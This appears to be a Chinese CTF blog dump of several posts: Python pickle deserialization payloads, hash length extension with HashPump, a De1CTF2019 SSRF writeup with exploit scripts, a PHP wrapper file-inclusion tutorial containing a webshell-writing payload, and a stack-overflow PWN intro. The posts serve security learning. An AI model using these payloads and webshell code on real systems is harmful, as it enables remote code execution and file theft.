属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，a.x 的查找顺序会从 a.dict[‘x’] 开始，然后是 type(a).dict[‘x’]，接下来依次查找 type(a) 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 关于描述符的讲解还可以看下这文章：https://foofish.net/what-is-descriptor-in-python.html 1234567891011121314151617181920212223242526272829303132class RevealAccess(object): &quot;&quot;&quot;A data descriptor that sets and returns values normally and prints a message logging their access. &quot;&quot;&quot; def __init__(self, initval=None, name=&#x27;var&#x27;): self.val = initval self.name = name def __get__(self, obj, objtype): print(&#x27;Retrieving&#x27;, self.name) return self.val def __set__(self, obj, val): print(&#x27;Updating&#x27;, self.name) self.val = val&gt;&gt;&gt; class MyClass(object):... x = RevealAccess(10, &#x27;var &quot;x&quot;&#x27;)... y = 5...&gt;&gt;&gt; m = MyClass()&gt;&gt;&gt; m.xRetrieving var &quot;x&quot;10&gt;&gt;&gt; m.x = 20Updating var &quot;x&quot;&gt;&gt;&gt; m.xRetrieving var &quot;x&quot;20&gt;&gt;&gt; m.y5 可清楚的看到，对属性 x 的操作都被 “hook” 住了，而 y 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 RevealAccess，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。 12345678910111213141516171819class MyClass(object): def __set__(self, obj, val): pass y = 5 m = MyClass()MyClass.x = mprint(m.x)m.y = 6print(m.y)m.x = 3print(m.x)&#x27;&#x27;&#x27;&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;6&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;&#x27;&#x27;&#x27; 把这个过程转为 pickle： 12345678910111213cstructsUserp100(I111I222tRp101g100(N&#125;S&#x27;__set__&#x27;g100sS&#x27;privileged&#x27;g101stbg101. 看一下结果： CISNC2019 iKun 12345678910111213import pickleimport urllibclass catflag(object): def __reduce__(self): #return (eval, (&quot;ls /&quot;,)) return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))payload= pickle.dumps(catflag())print(payload)print (urllib.quote(payload)) Python Opcode pickle.py–&gt;opcode 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# Pickle opcodes. See pickletools.py for extensive docs. The listing# here is in kind-of alphabetical order of 1-character pickle code.# pickletools groups them by purpose.MARK = b&#x27;(&#x27; # push special markobject on stackSTOP = b&#x27;.&#x27; # every pickle ends with STOPPOP = b&#x27;0&#x27; # discard topmost stack itemPOP_MARK = b&#x27;1&#x27; # discard stack top through topmost markobjectDUP = b&#x27;2&#x27; # duplicate top stack itemFLOAT = b&#x27;F&#x27; # push float object; decimal string argumentINT = b&#x27;I&#x27; # push integer or bool; decimal string argumentBININT = b&#x27;J&#x27; # push four-byte signed intBININT1 = b&#x27;K&#x27; # push 1-byte unsigned intLONG = b&#x27;L&#x27; # push long; decimal string argumentBININT2 = b&#x27;M&#x27; # push 2-byte unsigned intNONE = b&#x27;N&#x27; # push NonePERSID = b&#x27;P&#x27; # push persistent object; id is taken from string argBINPERSID = b&#x27;Q&#x27; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b&#x27;R&#x27; # apply callable to argtuple, both on stackSTRING = b&#x27;S&#x27; # push string; NL-terminated string argumentBINSTRING = b&#x27;T&#x27; # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b&#x27;V&#x27; # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE = b&#x27;X&#x27; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b&#x27;a&#x27; # append stack top to list below itBUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()GLOBAL = b&#x27;c&#x27; # push self.find_class(modname, name); 2 string argsDICT = b&#x27;d&#x27; # build a dict from stack itemsEMPTY_DICT = b&#x27;&#125;&#x27; # push empty dictAPPENDS = b&#x27;e&#x27; # extend list on stack by topmost stack sliceGET = b&#x27;g&#x27; # push item from memo on stack; index is string argBINGET = b&#x27;h&#x27; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b&#x27;i&#x27; # build &amp; push class instanceLONG_BINGET = b&#x27;j&#x27; # push item from memo on stack; index is 4-byte argLIST = b&#x27;l&#x27; # build list from topmost stack itemsEMPTY_LIST = b&#x27;]&#x27; # push empty listOBJ = b&#x27;o&#x27; # build &amp; push class instancePUT = b&#x27;p&#x27; # store stack top in memo; index is string argBINPUT = b&#x27;q&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b&#x27;r&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b&#x27;s&#x27; # add key+value pair to dictTUPLE = b&#x27;t&#x27; # build tuple from topmost stack itemsEMPTY_TUPLE = b&#x27;)&#x27; # push empty tupleSETITEMS = b&#x27;u&#x27; # modify dict by adding topmost key+value pairsBINFLOAT = b&#x27;G&#x27; # push float; arg is 8-byte float encodingTRUE = b&#x27;I01\\n&#x27; # not an opcode; see INT docs in pickletools.pyFALSE = b&#x27;I00\\n&#x27; # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO = b&#x27;\\x80&#x27; # identify pickle protocolNEWOBJ = b&#x27;\\x81&#x27; # build object by applying cls.__new__ to argtupleEXT1 = b&#x27;\\x82&#x27; # push object from extension registry; 1-byte indexEXT2 = b&#x27;\\x83&#x27; # ditto, but 2-byte indexEXT4 = b&#x27;\\x84&#x27; # ditto, but 4-byte indexTUPLE1 = b&#x27;\\x85&#x27; # build 1-tuple from stack topTUPLE2 = b&#x27;\\x86&#x27; # build 2-tuple from two topmost stack itemsTUPLE3 = b&#x27;\\x87&#x27; # build 3-tuple from three topmost stack itemsNEWTRUE = b&#x27;\\x88&#x27; # push TrueNEWFALSE = b&#x27;\\x89&#x27; # push FalseLONG1 = b&#x27;\\x8a&#x27; # push long from &lt; 256 bytesLONG4 = b&#x27;\\x8b&#x27; # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES = b&#x27;B&#x27; # push bytes; counted binary string argumentSHORT_BINBYTES = b&#x27;C&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b&#x27;\\x8c&#x27; # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8 = b&#x27;\\x8d&#x27; # push very long stringBINBYTES8 = b&#x27;\\x8e&#x27; # push very long bytes stringEMPTY_SET = b&#x27;\\x8f&#x27; # push empty set on the stackADDITEMS = b&#x27;\\x90&#x27; # modify set by adding topmost stack itemsFROZENSET = b&#x27;\\x91&#x27; # build frozenset from topmost stack itemsNEWOBJ_EX = b&#x27;\\x92&#x27; # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL = b&#x27;\\x93&#x27; # same as GLOBAL but using names on the stacksMEMOIZE = b&#x27;\\x94&#x27; # store top of the stack in memoFRAME = b&#x27;\\x95&#x27; # indicate the beginning of a new frame PDF http://bendawang.site/2018/03/01/关于Python-sec的一些总结/ https://www.codercto.com/a/81823.html 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 https://www.anquanke.com/post/id/188981"},{"title":"哈系长度扩展攻击-hashpumpy","date":"2020-03-06","updated":"2024-03-19","path":"2020/03/06/哈系长度扩展攻击-hashpumpy/","text":"工具 12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 至于想在python里实现hashpump，可以使用hashpumpy这个插件： （注意还是得先安装了libssl-dev） 1pip install hashpumpy 推荐在linux里使用，使用方法可以这样获取： 123python&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump) HashPump用法 这里以一个实验吧题目为例，关键的代码大概如下： [](javascript:void(0);) 1234567891011&lt;?php$secret=&quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username=&quot;admin&quot;;$password = $_POST[&quot;password&quot;];if($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))&#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag);&#125;else&#123; die(&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;);&#125;?&gt; [](javascript:void(0);) 在题目里可以得到: 1md5($secret.&quot;adminadmin&quot;)的值为571580b26c65f306376d4f64e53cb5c7 稍微整理下我们已经知道的： 123$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20而数据是admin签名（哈希值）是571580b26c65f306376d4f64e53cb5c7 这时候我们使用HashPump，附加数据至少1位以上： 12345# hashpumpInput Signature: 571580b26c65f306376d4f64e53cb5c7Input Data: adminInput Key Length: 20Input Data to Add: pcat 或者直接 1hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat 就会得到 123e67e8f0c05e1ad68020df30bbc505f5admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00pcat 第一个是新的签名，把它设置到cookies的getmein里。 第二个先把\\x替换为%后，post提交 1password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat 就可以通过了。 原理 1. MD5加密原理 首先是分组。MD5加密将二进制字符串按照512位（也就是64字节）分为一组，然后再把每组分成16个子分组，每组32位。 分完组后就要进行填充，填充分为两部。首先使他补充到N64+56字节。填充的规则（按照二进制）是先填一个1，之后再填0。按照16进制来算，就是先填一个8，然后填0，直到长度满足N64+56为止。 填充的第二步。之前的长度已经是N*64+56字节了，接下来我们还要填充8字节，用来描述原始二进制字符串的长度。这样最后的数据就是（N+1）*64字节。例如，'abcd’这四个字母，他的长度是4个字节也就是32bit，用十六进制来描述其长度的话就是20，这样最后最后八个字节就是20000000。（为什么是20000000而不是00000020呢，因为md5中存储都是用的小端方式）。如果原始二进制字符串的长度超出了64位（8字节）所能表示的，就只取低长度的低64位。 MD5算法中有四个被称作链接变量(魔数,向量)的整数参数，他们的长度都是32位，分别是：A=0x01234567，B=0x89abcdef，C=0xfedcba98，D=0x76543210。（但是在md5中要按照上面说的小端方式） 把ABCD的值赋值给abcd，用abcd对一个分组的子分组进行一系列神奇的运算，得出新的abcd，然后这个新的abcd又和下一个分组进行神奇的运算，以此类推，最后就会得出一个128位加密后的值，用16进制来表示也就是我们看到的32位的md5。 2. 加盐措施介绍 以往网站开发人员常常把用户密码的md5值存储在数据库，但攻击者常常把一些常用字符串生成md5字典，通过比较网站数据库密码的md5值得到真正的密码。为了加强安全，开发人员又通过加盐（salt）的方式来存储密码数据，具体措施是自定义一个字符串，这个字符串谁都看不到。当用户进行注册的时候，把md5（salt+密码）的值进行存储，以后用户每次登陆都在后台把用户输入的密码加盐再md5加密与数据库进行比较。由于攻击者不知道盐是什么，很难通过爆破的方式来获取密码。 3. MD5拓展攻击 MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现： 我们要知道salt的长度。 要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。 用户可以提交md5值。 Hash Length Extension Attack"},{"title":"De1CTF2019","date":"2020-03-05","updated":"2024-03-19","path":"2020/03/05/De1CTF2019/","text":"SSRF Me 题目提示我们flag在./flag.txt 进去就是源码，一个flask框架的简易web应用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print(resp) tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80) 大概思路就是在 /De1ta 中 设置param=flag.txt ，绕过checksign检查，并且action的值中有read和scan这两个字符串，然后就会去读取param设置的值: flag.txt，其中，checksign 为sign=md5(secert_key + param + action),/geneSign路由可以根据传入的param值构造sign=md5(secert_key+param+action)但是action被自动赋值成了scan。 解法一 字符串拼接 /geneSign路由生成的sign值为:md5(secert_key+param+'scan'),我们的目的是获取md5(secert_key+'flag.txt'+'read'+'scan')，param是我们可控的，令param=flag.txtread,获取到sign值即可绕过checksign。 12/geneSign?param=flag.txtreada3428fe51c0ebdf4540c6276b440ab24 flag{5fdf7dfe-3b47-4b05-a571-412d6e2c897f} 解法二 哈系长度扩展攻击 Hash Length Extension Attack secert_key 是一个长度为 16 的字符串，checksign比较的是用户传入的sign == md5(secert_key+用户提交param+用户提交action)，在 /geneSign?param=flag.txt 中可以获取 md5(secert_key + 用户提交param + 'scan') 的值，其中param是flag.txt,而action中需要包含read和scan字符串。 思路就是利用在 /geneSign?param=flag.txt 中获取到的md5(secert_key + 用户提交param + 'scan')作为md5下一次加密的4个magic number，来加密我们新增的read字符串 geneSign?param=flag.txt --&gt; 4db6d8b5a7ddcee0c51eaba436e10620 使用 hashpump 即可: 1234567root@kali:/opt/HashPump# hashpump Input Signature: 4db6d8b5a7ddcee0c51eaba436e10620Input Data: scanInput Key Length: 24Input Data to Add: read2c20c718eae5622e8bfb4a21134ab405scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read python提交 1234567891011import requestsurl = &#x27;http://139.180.128.86/De1ta?param=flag.txt&#x27;cookies = &#123; &#x27;sign&#x27;: &#x27;2c20c718eae5622e8bfb4a21134ab405&#x27;, &#x27;action&#x27;: &#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;, &#125;res = requests.get(url=url, cookies=cookies)print(res.text) 或者burpsuite 解法三 local_file 天枢大佬们的做法 : https://xz.aliyun.com/t/5921#toc-16 放上他们的 exp : 12345678910111213141516171819202122232425262728293031import requestsconn = requests.Session()url = &quot;http://139.180.128.86&quot;def geneSign(param): data = &#123; &quot;param&quot;: param &#125; resp = conn.get(url+&quot;/geneSign&quot;,params=data).text print resp return respdef challenge(action,param,sign): cookie=&#123; &quot;action&quot;:action, &quot;sign&quot;:sign &#125; params=&#123; &quot;param&quot;:param &#125; resp = conn.get(url+&quot;/De1ta&quot;,params=params,cookies=cookie) return resp.textfilename = &quot;local_file:///app/flag.txt&quot;a = []for i in range(1): sign = geneSign(&quot;&#123;&#125;read&quot;.format(filename.format(i))) resp = challenge(&quot;readscan&quot;,filename.format(i),sign) if(&quot;title&quot; in resp): a.append(i) print resp,iprint a 请求 /geneSign?param=local_file:///app/flag.txtread 获取 md5 值为 60ff07b83381a35d13caaf2daf583c94 ，即 md5(secert_key + 'local_file:///app/flag.txtread' + 'scan') 然后再请求 /De1ta?param=local_file:///app/flag.txt 构造 cookie action=readscan;sign=60ff07b83381a35d13caaf2daf583c94 以上就是他们 exp 做的事情，和上一个方法差不多 关于 local_file : 参考 : https://bugs.python.org/issue35907 这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ，否则会报 ValueError: unknown url type: /path/to/file 的错误"},{"title":"php伪协议","date":"2020-03-05","updated":"2024-03-19","path":"2020/03/05/php伪协议/","text":"文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。 首先归纳下常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，计划对文件包含漏洞与php封装协议的利用方法进行总结，本篇先总结下一些封装协议，涉及的相关协议：file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://，后续再对每个文件包含函数进一步进行探讨。 环境概要： PHP.ini： allow_url_fopen ：on 默认开启 该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。 allow_url_include：off 默认关闭，该选项为on便是允许 包含URL 对象文件等。 为了能够尽可能的列举所有情况本次测试使用的PHP版本为&gt;=5.2 具体为5.2，5.3，5.5，7.0；PHP版本&lt;=5.2 可以使用%00进行截断。 0×01 是否截断问题： 本篇由以下这个简单的例子进行探讨，首先看如下两种文件包含情况。 情况一：不需要截断： http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt 123&lt;?php include($_GET[&#x27;file&#x27;])?&gt; 情况二：需要截断： 在php版本&lt;=5.2中进行测试是可以使用%00截断的。 http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt\u0000 123&lt;?php include($_GET[&#x27;file&#x27;].’.php’)?&gt; 0×02 allow_url_fopen与allow_url_include是否开启的问题： 【file://协议】 PHP.ini： file:// 协议在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 参考自：http://php.net/manual/zh/wrappers.file.php 使用方法： file:// [文件的绝对路径和文件名] http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt 【php://协议】 条件： 不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。 php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 参考自：http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 PHP.ini： php://filter在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on 测试现象： http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 PHP.ini： allow_url_fopen ：off/on allow_url_include：on 测试现象： http://127.0.0.1/cmd.php?file=php://input [POST DATA] &lt;?php phpinfo()?&gt; 也可以POST如下内容生成一句话： &lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt; 【zip://, bzip2://, zlib://协议】 PHP.ini： zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用； allow_url_fopen ：off/on allow_url_include：off/on zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 参考自：http://php.net/manual/zh/wrappers.compression.php 【zip://协议】 使用方法： zip://archive.zip#dir/file.txt zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 测试现象： http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt 先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。 由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。 【bzip2://协议】 使用方法： compress.bzip2://file.bz2 测试现象： http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg or http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg 【zlib://协议】 使用方法： compress.zlib://file.gz 测试现象： http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg or http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg 【data://协议】 经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件 PHP.ini： data://协议必须双在on才能正常使用； allow_url_fopen ：on allow_url_include：on 参考自：http://php.net/manual/zh/wrappers.data.php, 官方文档上allow_url_fopen应为yes。 测试现象： http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt; or http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 也可以： http://127.0.0.1/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt; or http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 0×03 常规小结： PHP封装协议在CTF蛮常见的，是经常会遇到的出题点，如下便是对本篇涉及的封装协议进行的总结，期待小伙伴的交流和补充。 安全客-php伪协议实现命令执行的七种姿势"},{"title":"SSRF漏洞","date":"2020-03-04","updated":"2024-03-19","path":"2020/03/04/SSRF漏洞/","text":""},{"title":"kali2020恢复到以前的安全模式","date":"2020-03-03","updated":"2024-03-19","path":"2020/03/03/kali2020恢复到以前的安全模式/","text":"Kali Kali Non-Root User Implementation There are a number of changes you can expect to see as part of this change. Kali in live mode will be running as user kali password kali. No more root/toor. (Get ready to set up your IDS filters, as we are sure this user/pass combo will be being scanned for by bots everywhere soon). On install, Kali will prompt you to create a non-root user that will have administrative privileges (due to its addition to the sudo group). This is the same process as other Linux distros you may be familiar with. Tools that we identify as needing root access, as well as common administrative functions such as starting/stopping services, will interactively ask for administrative privileges (at least when started from the Kali menu). If you really don’t care about security, and if you preferred the old model, you can install kali-grant-root and run dpkg-reconfigure kali-grant-root to configure password-less root rights. apt update &amp;&amp; apt install -y kali-grant-root ![屏幕截图 2020-03-04 11:19:40](kali2020恢复到以前的安全模式/屏幕截图 2020-03-04 111940.png)"},{"title":"kali_env","date":"2020-03-02","updated":"2024-03-19","path":"2020/03/02/kali-env/","text":"https://extensions.gnome.org/extension/120/system-monitor/"},{"title":"PWN环境","date":"2020-03-01","updated":"2024-03-19","path":"2020/03/01/PWN环境/","text":"之前一直好好的环境突然就各种问题。。。 提示qemu不能用，apt-get install qemu也没用，网上一大堆都没用 最后尝试了一下apt-get install qemu-system-i386终于可以用了。。。 bugs which make the head big GDB插件配置与实用.gdbinit gdb插件冲突 我们在安装peda和pwngdb这两个各有特点(pwngdb调试堆一绝)的插件时,可能会遇到这样的问题,一般起因是因为先装了peda,之后装pwngdb,在.gdbinit文件中未及时注释掉,也即这样 source ~/peda/peda.py source /home/pic/pwndbg/gdbinit.py 造成如下问题 1234567891011121314Traceback (most recent call last): File &quot;/home/pic/pwndbg/gdbinit.py&quot;, line 36, in &lt;module&gt; import pwndbg # isort:skip File &quot;/home/pic/pwndbg/pwndbg/__init__.py&quot;, line 19, in &lt;module&gt; import pwndbg.commands.aslr File &quot;/home/pic/pwndbg/pwndbg/commands/aslr.py&quot;, line 24, in &lt;module&gt; def aslr(state=None): File &quot;/home/pic/pwndbg/pwndbg/commands/__init__.py&quot;, line 298, in __call__ return _ArgparsedCommand(self.parser, function) File &quot;/home/pic/pwndbg/pwndbg/commands/__init__.py&quot;, line 267, in __init__ super(_ArgparsedCommand, self).__init__(function, command_name=command_name, *a, **kw) File &quot;/home/pic/pwndbg/pwndbg/commands/__init__.py&quot;, line 61, in __init__ raise Exception(&#x27;Cannot override non-whitelisted built-in command &quot;%s&quot;&#x27; % command_name)Exception: Cannot override non-whitelisted built-in command &quot;aslr&quot; 看到大意是想把aslr重写但是失败了,解决方法便是将.gdbinit文件第一行注释掉 vim ~/.gdbinit source ~/peda/peda.py source /home/pic/pwndbg/gdbinit.py 这个脚本一键搭建 https://github.com/giantbranch/pwn-env-init PWN环境"},{"title":"康一康PWN","date":"2020-03-01","updated":"2024-03-19","path":"2020/03/01/康一康PWN/","text":"建立一个文件1.c: 123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50];//0x100大小的栈空间 read(0, name, 0x100);//输入0x200大小的数据 write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 0x02 x86下无任何防护机制 编译方式： 1gcc -m32 -g 1.c -o 1 -O0 -fno-stack-protector -z execstack **m32:**生成32bit程序需要gcc-multilib(x86机器上编译不用加) **O0:**不进行任何优化 **fno-stack-protector:**不开启canary栈溢出检测 **z execstack:**开启栈可执行关闭NX 首先寻找多少字节能溢出切刚好能够覆盖return addr。我们使用gdb-peda提供的pattern_create和pattern_offset。pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。 打开gdb 12gdb-peda$ pattern_create 200&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27; 然后让程序跑起来输入这串字符串后程序崩溃。 123456789101112131415161718192021222324252627282930313233343536gdb-peda$ file 1Reading symbols from 1...(No debugging symbols found in 1)gdb-peda$ rStarting program: /root/PWN/1 1AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAB���UVp`UV�`UV�aUVt���bUVpbUV�B��l���Program received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x100 EBX: 0x35414166 (&#x27;fAA5&#x27;)ECX: 0xffffcd70 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)EDX: 0x100 ESI: 0xf7fa7000 --&gt; 0x1d6d6c EDI: 0xf7fa7000 --&gt; 0x1d6d6c EBP: 0x414b4141 (&#x27;AAKA&#x27;)ESP: 0xffffcdd0 (&quot;6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)EIP: 0x41416741 (&#x27;AgAA&#x27;)EFLAGS: 